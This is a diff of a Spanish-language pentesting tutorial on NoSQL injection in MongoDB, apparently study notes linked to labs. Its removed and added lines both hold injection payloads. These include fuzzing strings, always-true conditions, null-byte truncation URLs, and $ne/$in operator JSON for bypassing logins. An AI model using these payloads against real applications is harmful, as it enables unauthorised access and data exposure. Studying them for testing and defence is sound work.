@@ -165,211 +165,58 @@ this.category == 'fizzy' || '1'=='1'
 
 ---
 
-# NoSQL Injection
+## 🧪 Truncamiento mediante null byte (\u0000)
 
-Una **NoSQL Injection** es una vulnerabilidad de seguridad que permite a un atacante manipular las consultas realizadas por una aplicación hacia una base de datos NoSQL. A diferencia de las bases de datos relacionales SQL, las NoSQL (como MongoDB, CouchDB, Firebase, etc.) utilizan distintos lenguajes de consulta, estructuras de datos flexibles y menos restricciones relacionales.
+Una técnica interesante en ataques NoSQL consiste en utilizar un carácter nulo (`%00`) para truncar la consulta y evitar que se evalúen condiciones adicionales.
 
-Esta vulnerabilidad puede permitir a un atacante:
+### 🔎 Ejemplo práctico
 
-* Bypassear mecanismos de autenticación o autorización.
-* Leer, modificar o eliminar datos arbitrarios.
-* Ejecutar código en el servidor (en algunos entornos).
-* Causar denegación de servicio.
-
----
-
-## 🧰 ¿Cómo funciona?
-
-Las aplicaciones modernas muchas veces reciben datos del cliente (formularios, URLs, JSON) que luego utilizan para construir consultas hacia la base de datos. Si estos datos no son validados correctamente, un atacante podría inyectar fragmentos de código malicioso que se ejecuten como parte de la consulta NoSQL.
-
----
-
-## ✍️ Tipos de NoSQL Injection
-
-### 1. Inyección de Sintaxis (Syntax Injection)
-
-El atacante puede modificar la sintaxis de la consulta con caracteres especiales, logrando alterar su comportamiento.
-
-Ejemplo:
-
-```js
-// Consulta en MongoDB:
-db.products.find({ category: userInput })
-```
-
-Si `userInput` es:
-
-```js
-"fizzy'||'1'=='1"
-```
-
-Entonces la consulta queda:
-
-```js
-{ category: 'fizzy'||'1'=='1' }
-```
-
-Esto puede devolver todos los productos sin importar su categoría.
-
-### 2. Inyección de Operadores (Operator Injection)
-
-El atacante utiliza operadores de la base NoSQL como `$ne`, `$gt`, `$regex`, `$where`, etc., para alterar la consulta sin romper la sintaxis.
-
-Ejemplo:
-
-```json
-{
-  "username": { "$ne": null },
-  "password": { "$ne": null }
-}
-```
-
-Esto puede saltarse una autenticación básica si no se sanitizan los campos.
-
----
-
-## 🔢 MongoDB como objetivo principal
-
-MongoDB es una de las bases de datos NoSQL más utilizadas y es muy propensa a este tipo de vulnerabilidades cuando se trabaja con datos JSON desde el cliente.
-
-### Consulta común:
-
-```js
-// URL:
-https://inseguro.com/product/lookup?category=fizzy
-
-// Query que ejecuta:
-this.category == 'fizzy'
-```
-
----
-
-## 🔍 Detectando NoSQL Injection (fuzzing)
-
-### Prueba con cadenas especiales:
-
-Probar si el input del parámetro `category` permite alterar la sintaxis:
-
-```
-category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
-```
-
-Versión decodificada:
-
-```js
-"`{
-;$Foo}
-$Foo \xYZ\0
-```
-
-Cambios inesperados en la respuesta pueden indicar procesamiento no seguro del input.
-
-### Prueba con comillas simples:
-
-```
-category='
-```
-
-Consulta generada:
-
-```
-this.category == '''
-```
-
-Si se rompe la consulta, podría indicar un punto de inyección.
-
----
-
-## 🔠 Confirmando comportamiento condicional
-
-Una técnica común es inyectar condiciones booleanas:
-
-* Falsa:
-
-```
-fizzy' && 0 && 'x
-```
-
-* Verdadera:
-
-```
-fizzy' && 1 && 'x
-```
-
-Si la aplicación responde distinto para ambas, entonces el input modifica la lógica del servidor.
-
----
-
-## 🔫 Anulando condiciones
-
-Una vez que se sabe que la inyección funciona, se puede intentar inyectar una condición siempre verdadera:
-
-Payload:
-
-```
-fizzy'||'1'=='1
-```
-
-URL codificada:
-
-```
-category=fizzy%27%7c%7c%271%27%3d%3d%271
-```
-
-Consulta resultante:
-
-```
-this.category == 'fizzy' || '1'=='1'
-```
-
-Esto forzaría a MongoDB a retornar todos los productos de la categoría, sin importar si cumplen alguna condición adicional.
-
----
-
-## 🧪 Usando el carácter nulo para truncar condiciones
-
-MongoDB puede **ignorar todos los caracteres después de un carácter nulo** (`\u0000`), lo cual permite **anular condiciones adicionales** en la consulta.
-
-Por ejemplo, si el backend implementa:
+Supongamos que la aplicación realiza una consulta como la siguiente:
 
 ```js
 this.category == 'fizzy' && this.released == 1
 ```
 
-El objetivo es mostrar únicamente productos lanzados oficialmente (`released == 1`). Pero si inyectamos un null byte, como:
+Esta lógica busca mostrar solo productos oficialmente lanzados (`released`). Sin embargo, si el atacante logra inyectar un carácter nulo (`\u0000`), es posible anular la segunda condición, por ejemplo mediante la siguiente URL:
 
-```
+```arduino
 https://insecure-website.com/product/lookup?category=fizzy'%00
 ```
 
-Entonces la consulta queda:
+El motor de consulta interpretaría:
 
 ```js
 this.category == 'fizzy'\u0000' && this.released == 1
 ```
 
-El motor de MongoDB podría ignorar todo lo posterior al null byte, y por ende la condición `this.released == 1` no se evalúa. Esto **muestra productos no lanzados (unreleased)**.
+Y debido a que MongoDB y algunos lenguajes de backend ignoran todo lo posterior al null byte, se omite la condición `this.released == 1`, mostrando también los productos no lanzados (`released == 0`).
 
-Este tipo de ataque se conoce como **null byte truncation**.
+### 🧠 Consideraciones
 
-🔎 Algunos entornos o frameworks modernos pueden prevenir esto, pero **aún se encuentra presente** en muchas implementaciones.
+* Este ataque depende de cómo el backend maneja los caracteres nulos.
+* Muchos lenguajes modernos ya no permiten `\u0000` en strings, pero aún existen casos reales donde funciona.
+* Es ideal para bypassear filtros booleanos adicionales, sin romper la sintaxis.
 
 ---
 
-## 💣 NoSQL Operator Injection
+## ⚙️ Inyección de operadores NoSQL
 
-Los motores NoSQL como MongoDB utilizan **operadores especiales** dentro de sus consultas, como:
+Las bases de datos NoSQL, como MongoDB, utilizan operadores especiales para definir condiciones más complejas dentro de sus consultas. Algunos de los más comunes son:
 
-* `$where` – Evalúa una expresión JavaScript.
-* `$ne` – Distinto de...
-* `$in` – Pertenece a un array.
-* `$regex` – Coincidencia con expresiones regulares.
+| Operador | Descripción                            |
+| -------- | -------------------------------------- |
+| `$where` | Ejecuta una expresión JavaScript       |
+| `$ne`    | Distinto de...                         |
+| `$in`    | Pertenencia a un array                 |
+| `$regex` | Coincidencia con una expresión regular |
 
-Si el input del usuario no está sanitizado, **es posible inyectar estos operadores** directamente.
+Si la aplicación no valida correctamente los datos del usuario, es posible inyectar estos operadores directamente y alterar la lógica de la consulta.
 
-### 🔧 Inyección en mensajes JSON (POST):
+### 📤 Inyectando operadores desde el cliente
 
-Supongamos una petición normal:
+#### 🔧 En JSON (cuerpo de POST)
+
+Petición legítima:
 
 ```json
 {
@@ -378,7 +225,7 @@ Supongamos una petición normal:
 }
 ```
 
-Podemos probar inyectando operadores:
+Inyección con `$ne`:
 
 ```json
 {
@@ -387,9 +234,9 @@ Podemos probar inyectando operadores:
 }
 ```
 
-Esto consultaría: "usuarios cuyo nombre NO sea 'invalid'" y cuya password sea 'peter'.
+Esto selecciona usuarios cuyo nombre no sea `invalid`, y cuya contraseña sea `peter`.
 
-Si el backend procesa operadores también en `password`, podríamos intentar:
+Si ambos campos permiten operadores, se puede bypassear el login con:
 
 ```json
 {
@@ -398,11 +245,11 @@ Si el backend procesa operadores también en `password`, podríamos intentar:
 }
 ```
 
-Esto hace match con cualquier usuario donde **ambos campos sean distintos a 'invalid'**, es decir, **devuelve todos los usuarios**.
+Esto coincidirá con cualquier usuario válido, ya que las condiciones siempre se cumplen.
 
-### 🎯 Ataques más dirigidos
+### 🎯 Targeteando usuarios específicos
 
-Podemos apuntar a un usuario específico utilizando `$in`:
+También es posible apuntar a roles como admin con:
 
 ```json
 {
@@ -411,28 +258,25 @@ Podemos apuntar a un usuario específico utilizando `$in`:
 }
 ```
 
-Esto devuelve un usuario con alguno de esos nombres y cualquier contraseña no vacía.
+Esto devuelve cualquier usuario con uno de esos nombres y contraseña no vacía.
 
----
+### 🌐 Inyección vía parámetros de URL
 
-## 🛠 Técnicas para inyectar operadores
+Si la app recibe datos vía GET:
 
-### Desde GET (parámetros de URL):
-
-```
+```bash
 username[$ne]=admin&password[$ne]=1234
 ```
 
-Esto puede no funcionar si el servidor no convierte correctamente estructuras tipo `key[$op]`.
+Esto intenta construir un objeto anidado para inyectar `$ne`.
 
-### Alternativas:
+En caso de que la app no procese adecuadamente esta estructura, se recomienda:
 
-* Cambiar a método `POST`
-* Usar `Content-Type: application/json`
-* Enviar el JSON manualmente en el cuerpo de la petición
+* Cambiar a POST.
+* Establecer `Content-Type: application/json`.
+* Inyectar el payload como JSON en el cuerpo.
 
-💡 **Extensión útil**: \[Content Type Converter (Burp Suite)] permite convertir fácilmente entre `x-www-form-urlencoded` y `JSON`.
-
+💡 **Consejo**: En Burp Suite, la extensión **Content Type Converter** puede facilitar esta transformación automáticamente.
 ---
 
 [Lab: Detecting NoSQL injection](1_Detecting_NoSQL_injection.md)
